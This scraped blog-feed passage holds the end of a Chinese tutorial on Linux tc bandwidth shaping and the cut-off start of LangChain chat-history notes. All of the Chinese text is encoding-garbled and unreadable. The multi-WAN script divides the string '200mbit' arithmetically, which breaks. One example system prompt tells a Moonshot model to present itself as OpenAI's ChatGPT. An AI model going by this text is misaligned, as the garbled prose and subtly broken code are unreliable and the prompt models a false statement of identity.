<span class="hljs-comment"># æœ¬æœºé™é€Ÿé…ç½®</span>
tc qdisc add dev <span class="hljs-variable">$DEV</span> root handle 1: htb default 1
tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:1 htb rate 1000mbit
tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:10 htb rate <span class="hljs-variable">$LIMIT_RATE</span> ceil <span class="hljs-variable">$LIMIT_RATE</span> burst 15k
tc qdisc add dev <span class="hljs-variable">$DEV</span> parent 1:10 handle 10: sfq perturb 10
tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 1 u32 \
  match ip dst <span class="hljs-variable">$PEER_IP</span> flowid 1:10

<span class="hljs-built_in">echo</span> <span class="hljs-string">"MySQLåŒæ­¥é™é€Ÿé…ç½®å®Œæˆï¼š<span class="hljs-variable">$LIMIT_RATE</span>"</span>
</code></pre>
<h2 data-id="heading-20">äº”ã€ç›‘æ§ä¸è°ƒè¯•</h2>
<h3 data-id="heading-21">5.1 æŸ¥çœ‹TCé…ç½®</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æŸ¥çœ‹é˜Ÿåˆ—çŠ¶æ€</span>
tc -s qdisc show dev eth0

<span class="hljs-comment"># æŸ¥çœ‹ç±»åˆ«çŠ¶æ€</span>
tc -s <span class="hljs-keyword">class</span> <span class="hljs-title class_">show</span> dev eth0

<span class="hljs-comment"># æŸ¥çœ‹è¿‡æ»¤å™¨</span>
tc -s <span class="hljs-built_in">filter</span> show dev eth0

<span class="hljs-comment"># è¯¦ç»†ç»Ÿè®¡ä¿¡æ¯</span>
tc -s -d qdisc show dev eth0
tc -s -d <span class="hljs-keyword">class</span> <span class="hljs-title class_">show</span> dev eth0
</code></pre>
<h3 data-id="heading-22">5.2 å…³é”®æŒ‡æ ‡è§£è¯»</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># ç¤ºä¾‹è¾“å‡º</span>
qdisc htb <span class="hljs-number">1</span>: root refcnt <span class="hljs-number">2</span> r2q <span class="hljs-number">10</span> <span class="hljs-literal">default</span> <span class="hljs-number">1</span> direct_packets_stat <span class="hljs-number">0</span> ver <span class="hljs-number">3.17</span>
 Sent <span class="hljs-number">123456</span> bytes <span class="hljs-number">789</span> pkt (dropped <span class="hljs-number">0</span>, overlimits <span class="hljs-number">0</span> requeues <span class="hljs-number">0</span>) 
 backlog <span class="hljs-number">0b</span> <span class="hljs-number">0</span>p requeues <span class="hljs-number">0</span>
</code></pre>
<ul>
<li><strong>Sent</strong>ï¼šå‘é€çš„æ•°æ®é‡å’ŒåŒ…æ•°</li>
<li><strong>dropped</strong>ï¼šä¸¢å¼ƒçš„åŒ…æ•°ï¼Œéé›¶è¡¨ç¤ºæœ‰ä¸¢åŒ…</li>
<li><strong>overlimits</strong>ï¼šè¶…è¿‡é™åˆ¶çš„æ¬¡æ•°</li>
<li><strong>backlog</strong>ï¼šé˜Ÿåˆ—ä¸­ç§¯å‹çš„æ•°æ®</li>
</ul>
<h3 data-id="heading-23">5.3 å¸¦å®½æµ‹è¯•æ–¹æ³•</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># å®‰è£…æµ‹é€Ÿå·¥å…·</span>
yum install -y iperf3  <span class="hljs-meta"># CentOS</span>
apt-<span class="hljs-keyword">get</span> install -y iperf3  <span class="hljs-meta"># Ubuntu</span>

<span class="hljs-meta"># æœåŠ¡å™¨ç«¯</span>
iperf3 -s

<span class="hljs-meta"># å®¢æˆ·ç«¯</span>
iperf3 -c æœåŠ¡å™¨IP -t <span class="hljs-number">30</span> -P <span class="hljs-number">10</span>

<span class="hljs-meta"># ç®€å•çš„ç½‘ç»œæµ‹è¯•</span>
speedtest-cli  <span class="hljs-meta"># æµ‹è¯•å…¬ç½‘å¸¦å®½</span>
tcpping ç›®æ ‡IP  <span class="hljs-meta"># æµ‹è¯•å»¶è¿Ÿå’ŒæŠ–åŠ¨</span>
</code></pre>
<h2 data-id="heading-24">å…­ã€é«˜çº§æŠ€å·§ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-25">6.1 åŠ¨æ€è°ƒæ•´å¸¦å®½</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># dynamic-bandwidth.sh</span>
<span class="hljs-comment"># æ ¹æ®æ—¶é—´åŠ¨æ€è°ƒæ•´å¸¦å®½</span>

DEV=<span class="hljs-string">"eth0"</span>
DAY_RATE=<span class="hljs-string">"100mbit"</span>
NIGHT_RATE=<span class="hljs-string">"20mbit"</span>

<span class="hljs-function"><span class="hljs-title">adjust_bandwidth</span></span>() {
  HOUR=$(<span class="hljs-built_in">date</span> +%H)
  
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$HOUR</span> -ge 8 ] &amp;&amp; [ <span class="hljs-variable">$HOUR</span> -lt 20 ]; <span class="hljs-keyword">then</span>
    RATE=<span class="hljs-variable">$DAY_RATE</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"å·¥ä½œæ—¶é—´ï¼šè®¾ç½®å¸¦å®½ä¸º <span class="hljs-variable">$DAY_RATE</span>"</span>
  <span class="hljs-keyword">else</span>
    RATE=<span class="hljs-variable">$NIGHT_RATE</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"éå·¥ä½œæ—¶é—´ï¼šè®¾ç½®å¸¦å®½ä¸º <span class="hljs-variable">$NIGHT_RATE</span>"</span>
  <span class="hljs-keyword">fi</span>
  
  <span class="hljs-comment"># è°ƒæ•´é»˜è®¤ç±»åˆ«å¸¦å®½</span>
  tc class change dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:999 htb rate <span class="hljs-variable">$RATE</span> ceil <span class="hljs-variable">$RATE</span>
  
  <span class="hljs-comment"># è®°å½•æ—¥å¿—</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-subst">$(date)</span>: å¸¦å®½è°ƒæ•´ä¸º <span class="hljs-variable">$RATE</span>"</span> &gt;&gt; /var/log/tc-adjust.log
}

<span class="hljs-comment"># æ·»åŠ åˆ°crontabï¼Œæ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡</span>
<span class="hljs-comment"># 0 * * * * /path/to/dynamic-bandwidth.sh</span>
</code></pre>
<h3 data-id="heading-26">6.2 å¤šç½‘å¡è´Ÿè½½å‡è¡¡</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># multi-wan-balance.sh</span>
<span class="hljs-comment"># å¤šWANå£è´Ÿè½½å‡è¡¡ä¸é™é€Ÿ</span>

WAN1=<span class="hljs-string">"eth1"</span>
WAN2=<span class="hljs-string">"eth2"</span>
TOTAL_BW=<span class="hljs-string">"200mbit"</span>

<span class="hljs-comment"># ä¸ºæ¯ä¸ªWANå£è®¾ç½®HTB</span>
<span class="hljs-keyword">for</span> DEV <span class="hljs-keyword">in</span> <span class="hljs-variable">$WAN1</span> <span class="hljs-variable">$WAN2</span>; <span class="hljs-keyword">do</span>
  tc qdisc add dev <span class="hljs-variable">$DEV</span> root handle 1: htb default 1
  tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:1 htb rate $((<span class="hljs-variable">$TOTAL_BW</span>/<span class="hljs-number">2</span>))mbit
  
  <span class="hljs-comment"># ä¸ºä¸åŒæœåŠ¡åˆ†é…å¸¦å®½</span>
  tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:10 htb rate 20mbit ceil 30mbit  <span class="hljs-comment"># HTTP</span>
  tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:20 htb rate 10mbit ceil 20mbit  <span class="hljs-comment"># SSH</span>
  tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:30 htb rate 50mbit ceil 70mbit  <span class="hljs-comment"># é»˜è®¤</span>
  
  <span class="hljs-comment"># æ·»åŠ è¿‡æ»¤å™¨</span>
  tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 1 u32 \
    match ip dport 80 0xffff flowid 1:10
  tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 2 u32 \
    match ip dport 22 0xffff flowid 1:20
<span class="hljs-keyword">done</span>
</code></pre>
<h2 data-id="heading-27">ä¸ƒã€å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-28">Q1: TCè§„åˆ™é‡å¯åä¸¢å¤±ï¼Ÿ</h3>
<p><strong>A</strong>: å°†é…ç½®ä¿å­˜åˆ°å¯åŠ¨è„šæœ¬</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># CentOS/RHEL</span>
echo "/path/to/tc-script.sh" &gt;&gt; /etc/rc.local
chmod +x /etc/rc.local

<span class="hljs-comment"># æˆ–è€…ä½¿ç”¨systemd</span>
cat &gt; /etc/systemd/system/tc-traffic-control.service &lt;&lt; EOF
<span class="hljs-section">[Unit]</span>
<span class="hljs-attr">Description</span>=Traffic Control Service
<span class="hljs-attr">After</span>=network.target

<span class="hljs-section">[Service]</span>
<span class="hljs-attr">Type</span>=<span class="hljs-literal">on</span>eshot
<span class="hljs-attr">ExecStart</span>=/path/to/tc-script.sh
<span class="hljs-attr">RemainAfterExit</span>=<span class="hljs-literal">yes</span>

<span class="hljs-section">[Install]</span>
<span class="hljs-attr">WantedBy</span>=multi-user.target
EOF
</code></pre>
<h3 data-id="heading-29">Q2: å¦‚ä½•æŸ¥çœ‹å®æ—¶æµé‡ï¼Ÿ</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ä½¿ç”¨iftopæŸ¥çœ‹å®æ—¶æµé‡</span>
iftop -i eth0 -n

<span class="hljs-comment"># ä½¿ç”¨nethogsæŸ¥çœ‹è¿›ç¨‹æµé‡</span>
nethogs eth0

<span class="hljs-comment"># TCç›‘æ§è„šæœ¬</span>
watch -n 1 "tc -s qdisc show dev eth0<span class="hljs-comment">; echo '---'; tc -s class show dev eth0"</span>
</code></pre>
<h3 data-id="heading-30">Q3: é™é€Ÿä¸ç”Ÿæ•ˆï¼Ÿ</h3>
<ol>
<li>æ£€æŸ¥å•ä½ï¼šç¡®ä¿ä½¿ç”¨æ­£ç¡®çš„å•ä½ï¼ˆmbit vs mbyteï¼‰</li>
<li>æ£€æŸ¥è®¾å¤‡ï¼šç¡®ä¿åœ¨æ­£ç¡®çš„ç½‘ç»œæ¥å£ä¸Šé…ç½®</li>
<li>æ£€æŸ¥æ–¹å‘ï¼šTCä¸»è¦æ§åˆ¶å‡ºç«™ï¼ˆegressï¼‰æµé‡</li>
<li>æ£€æŸ¥ä¼˜å…ˆçº§ï¼šè¿‡æ»¤å™¨çš„prioå€¼å¯èƒ½å½±å“åŒ¹é…é¡ºåº</li>
</ol>
<h2 data-id="heading-31">å…«ã€æ€»ç»“</h2>
<p>TCæ˜¯Linuxç³»ç»Ÿä¸­å¼ºå¤§çš„æµé‡æ§åˆ¶å·¥å…·ï¼Œè™½ç„¶å­¦ä¹ æ›²çº¿è¾ƒé™¡å³­ï¼Œä½†ä¸€æ—¦æŒæ¡ï¼Œå°±èƒ½ç²¾ç»†æ§åˆ¶ç½‘ç»œæµé‡ã€‚å…³é”®ç‚¹ï¼š</p>
<ol>
<li><strong>ç†è§£æ¶æ„</strong>ï¼šqdisc-class-filterä¸‰çº§ç»“æ„</li>
<li><strong>é€‰å¯¹é˜Ÿåˆ—</strong>ï¼šHTBé€‚åˆå¤§å¤šæ•°åœºæ™¯ï¼Œç®€å•ä¸”åŠŸèƒ½å¼ºå¤§</li>
<li><strong>ç²¾ç»†åˆ†ç±»</strong>ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚åˆ›å»ºåˆç†çš„ç±»åˆ«</li>
<li><strong>æ­£ç¡®è¿‡æ»¤</strong>ï¼šä½¿ç”¨u32æˆ–fwç­‰è¿‡æ»¤å™¨ç²¾ç¡®åŒ¹é…æµé‡</li>
<li><strong>ç›‘æ§è°ƒè¯•</strong>ï¼šé€šè¿‡ç»Ÿè®¡ä¿¡æ¯éªŒè¯æ•ˆæœï¼ŒåŠæ—¶è°ƒæ•´</li>
</ol>
<p>é€šè¿‡åˆç†çš„TCé…ç½®ï¼Œå¯ä»¥å®ç°ï¼š</p>
<ul>
<li>å…³é”®ä¸šåŠ¡å¸¦å®½ä¿éšœ</li>
<li>é˜²æ­¢å¸¦å®½æ»¥ç”¨</li>
<li>æé«˜ç½‘ç»œç¨³å®šæ€§</li>
<li>ä¼˜åŒ–ç”¨æˆ·ä½“éªŒ</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[langchainå­¦ä¹ æ€»ç»“-ChatMessage ç»„ä»¶å­¦ä¹ ç¬”è®°]]></title>    <link>https://juejin.cn/post/7592582130593939507</link>    <guid>https://juejin.cn/post/7592582130593939507</guid>    <pubDate>2026-01-08T02:31:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592582130593939507" data-draft-id="7592552501579333658" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="langchainå­¦ä¹ æ€»ç»“-ChatMessage ç»„ä»¶å­¦ä¹ ç¬”è®°"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:31:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¿ƒåœ¨é£æ‰¬AI"/> <meta itemprop="url" content="https://juejin.cn/user/1556564194366823"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            langchainå­¦ä¹ æ€»ç»“-ChatMessage ç»„ä»¶å­¦ä¹ ç¬”è®°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1556564194366823/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¿ƒåœ¨é£æ‰¬AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:31:12.000Z" title="Thu Jan 08 2026 02:31:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ChatMessage ç»„ä»¶å­¦ä¹ ç¬”è®°</h2>
<h3 data-id="heading-1">ä¸€ã€ChatMessage æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>ChatMessageï¼ˆèŠå¤©æ¶ˆæ¯å†å²ç»„ä»¶ï¼‰æ˜¯ LangChain æ¡†æ¶ä¸­ç”¨äºç®¡ç†å’Œå­˜å‚¨å¯¹è¯å†å²çš„ç»„ä»¶ã€‚å®ƒæä¾›äº†å¤šç§å®ç°æ–¹å¼ï¼ŒåŒ…æ‹¬å†…å­˜å­˜å‚¨å’Œæ–‡ä»¶å­˜å‚¨ï¼Œèƒ½å¤Ÿå¸®åŠ© AI åº”ç”¨ç¨‹åºå®ç°å¤šè½®å¯¹è¯çš„ä¸Šä¸‹æ–‡è®°å¿†åŠŸèƒ½ã€‚</p>
<h4 data-id="heading-2">æ ¸å¿ƒç‰¹æ€§</h4>
<ul>
<li>è‡ªåŠ¨ç®¡ç†å¯¹è¯å†å²</li>
<li>æ”¯æŒå¤šç§å­˜å‚¨åç«¯ï¼ˆå†…å­˜ã€æ–‡ä»¶ã€æ•°æ®åº“ç­‰ï¼‰</li>
<li>æä¾›ç»Ÿä¸€çš„æ¥å£æ¥æ“ä½œæ¶ˆæ¯</li>
<li>æ”¯æŒ Humanï¼ˆç”¨æˆ·ï¼‰ã€AIï¼ˆåŠ©æ‰‹ï¼‰ã€Systemï¼ˆç³»ç»Ÿï¼‰ç­‰å¤šç§æ¶ˆæ¯ç±»å‹</li>
</ul>
<h3 data-id="heading-3">äºŒã€ChatMessage æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</h3>
<h4 data-id="heading-4">1. å®ç°å¤šè½®å¯¹è¯</h4>
<p>è®© AI èƒ½å¤Ÿè®°ä½ä¹‹å‰çš„å¯¹è¯å†…å®¹ï¼Œå®ç°è¿è´¯çš„å¤šè½®å¯¹è¯ä½“éªŒã€‚</p>
<h4 data-id="heading-5">2. ä¸Šä¸‹æ–‡ç®¡ç†</h4>
<p>è‡ªåŠ¨ç®¡ç†å¯¹è¯çš„ä¸Šä¸‹æ–‡ï¼Œé¿å…æ‰‹åŠ¨æ‹¼æ¥å†å²æ¶ˆæ¯çš„ç¹çå·¥ä½œã€‚</p>
<h4 data-id="heading-6">3. æŒä¹…åŒ–å­˜å‚¨</h4>
<p>æ”¯æŒå°†å¯¹è¯å†å²ä¿å­˜åˆ°æ–‡ä»¶æˆ–æ•°æ®åº“ï¼Œå®ç°è·¨ä¼šè¯çš„è®°å¿†åŠŸèƒ½ã€‚</p>
<h4 data-id="heading-7">4. ç®€åŒ–å¼€å‘</h4>
<p>æä¾›ç®€æ´çš„ APIï¼Œå¼€å‘è€…æ— éœ€å…³æ³¨åº•å±‚å­˜å‚¨ç»†èŠ‚ã€‚</p>
<h3 data-id="heading-8">ä¸‰ã€ä¸»è¦å®ç°ç±»</h3>
<h4 data-id="heading-9">1. InMemoryChatMessageHistoryï¼ˆå†…å­˜å­˜å‚¨ï¼‰</h4>
<p><strong>ç”¨é€”ï¼š</strong> å°†å¯¹è¯å†å²å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œé€‚åˆä¸´æ—¶å¯¹è¯æˆ–å•æ¬¡ä¼šè¯åœºæ™¯ã€‚</p>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>é€Ÿåº¦å¿«</li>
<li>æ— éœ€é¢å¤–é…ç½®</li>
<li>é€‚åˆæµ‹è¯•å’Œå¼€å‘</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>ç¨‹åºé‡å¯åæ•°æ®ä¸¢å¤±</li>
<li>ä¸æ”¯æŒè·¨ä¼šè¯è®°å¿†</li>
</ul>
<h4 data-id="heading-10">2. FileChatMessageHistoryï¼ˆæ–‡ä»¶å­˜å‚¨ï¼‰</h4>
<p><strong>ç”¨é€”ï¼š</strong> å°†å¯¹è¯å†å²æŒä¹…åŒ–åˆ°æ–‡ä»¶ä¸­ï¼Œé€‚åˆéœ€è¦é•¿æœŸä¿å­˜å¯¹è¯è®°å½•çš„åœºæ™¯ã€‚</p>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>æ•°æ®æŒä¹…åŒ–</li>
<li>è·¨ä¼šè¯è®°å¿†</li>
<li>ç®€å•å¯é </li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>è¯»å†™é€Ÿåº¦ç›¸å¯¹å†…å­˜æ…¢</li>
<li>å¹¶å‘è®¿é—®éœ€è¦æ³¨æ„æ–‡ä»¶é”</li>
</ul>
<h3 data-id="heading-11">å››ã€ä»£ç ç¤ºä¾‹ä¸è¾“å‡º</h3>
<h4 data-id="heading-12">ç¤ºä¾‹ 1ï¼šå†…å­˜å¯¹è¯æ¶ˆæ¯å†å²ç»„ä»¶</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.chat_history <span class="hljs-keyword">import</span> InMemoryChatMessageHistory

chat_history = InMemoryChatMessageHistory()

chat_history.add_user_message(<span class="hljs-string">"ä½ å¥½ï¼Œæˆ‘æ˜¯cccï¼Œä½ æ˜¯è°"</span>)
chat_history.add_ai_message(<span class="hljs-string">"ä½ å¥½ï¼Œæˆ‘æ˜¯chatgptï¼Œæœ‰ä»€ä¹ˆå¯ä»¥å¸®åˆ°ä½ ï¼Ÿ"</span>)

<span class="hljs-built_in">print</span>(chat_history.messages)
</code></pre>
<p><strong>è¾“å‡ºç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-python" lang="python">[
    HumanMessage(
        content=<span class="hljs-string">'ä½ å¥½ï¼Œæˆ‘æ˜¯cccï¼Œä½ æ˜¯è°'</span>,
        additional_kwargs={},
        response_metadata={}
    ),
    AIMessage(
        content=<span class="hljs-string">'ä½ å¥½ï¼Œæˆ‘æ˜¯chatgptï¼Œæœ‰ä»€ä¹ˆå¯ä»¥å¸®åˆ°ä½ ï¼Ÿ'</span>,
        additional_kwargs={},
        response_metadata={},
        tool_calls=[],
        invalid_tool_calls=[]
    )
]
</code></pre>
<p><strong>è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>add_user_message()</code> - æ·»åŠ ç”¨æˆ·æ¶ˆæ¯</li>
<li><code>add_ai_message()</code> - æ·»åŠ  AI æ¶ˆæ¯</li>
<li><code>messages</code> å±æ€§ - è·å–æ‰€æœ‰å†å²æ¶ˆæ¯åˆ—è¡¨</li>
</ul>
<h4 data-id="heading-13">ç¤ºä¾‹ 2ï¼šæ–‡ä»¶å¯¹è¯æ¶ˆæ¯å†å²ç»„ä»¶å®ç°è®°å¿†</h4>
<p><strong>ä»£ç ï¼š<a href="https://link.juejin.cn?target=2.%2520%25E6%2596%2587%25E4%25BB%25B6%25E5%25AF%25B9%25E8%25AF%259D%25E6%25B6%2588%25E6%2581%25AF%25E5%258E%2586%25E5%258F%25B2%25E7%25BB%2584%25E4%25BB%25B6%25E5%25AE%259E%25E7%258E%25B0%25E8%25AE%25B0%25E5%25BF%2586.py" target="_blank" title="2.%20%E6%96%87%E4%BB%B6%E5%AF%B9%E8%AF%9D%E6%B6%88%E6%81%AF%E5%8E%86%E5%8F%B2%E7%BB%84%E4%BB%B6%E5%AE%9E%E7%8E%B0%E8%AE%B0%E5%BF%86.py" ref="nofollow noopener noreferrer">2. æ–‡ä»¶å¯¹è¯æ¶ˆæ¯å†å²ç»„ä»¶å®ç°è®°å¿†.py</a></strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> dotenv
<span class="hljs-keyword">from</span> langchain_community.chat_message_histories <span class="hljs-keyword">import</span> FileChatMessageHistory
<span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI

dotenv.load_dotenv()

client = OpenAI(base_url=<span class="hljs-string">'https://api.moonshot.cn/v1'</span>)
chat_history = FileChatMessageHistory(<span class="hljs-string">'./memory.txt'</span>)

<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    query = <span class="hljs-built_in">input</span>(<span class="hljs-string">"Human:"</span>)

    <span class="hljs-keyword">if</span> query == <span class="hljs-string">"q"</span>:
        exit(<span class="hljs-number">0</span>)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">"AI"</span>, flush=<span class="hljs-literal">True</span>, end=<span class="hljs-string">""</span>)

    system_prompt = (
        <span class="hljs-string">"ä½ æ˜¯OpenAiå¼€å‘çš„ChatGptèŠå¤©æœºå™¨äººï¼Œå¯ä»¥æ ¹æ®ç›¸å¯¹åº”çš„ä¸Šä¸‹æ–‡å›å¤ç”¨æˆ·æ¶ˆæ¯ï¼Œä¸Šä¸‹æ–‡å­˜æ”¾çš„æ˜¯äººç±»å’Œä½ çš„å¯¹è¯ä¿¡æ¯åˆ—è¡¨"</span>
        <span class="hljs-string">f"&lt;context&gt;<span class="hljs-subst">{chat_history}</span>&lt;/context&gt;\n\n"</span>
    )
    <span class="hljs-built_in">print</span>(chat_history, <span class="hljs-string">'chat_history'</span>)

    response = client.chat.completions.create(
        model=<span class="hljs-string">'moonshot-v1-8k'</span>,
        messages=[
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: system_prompt},
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: query}
        ],
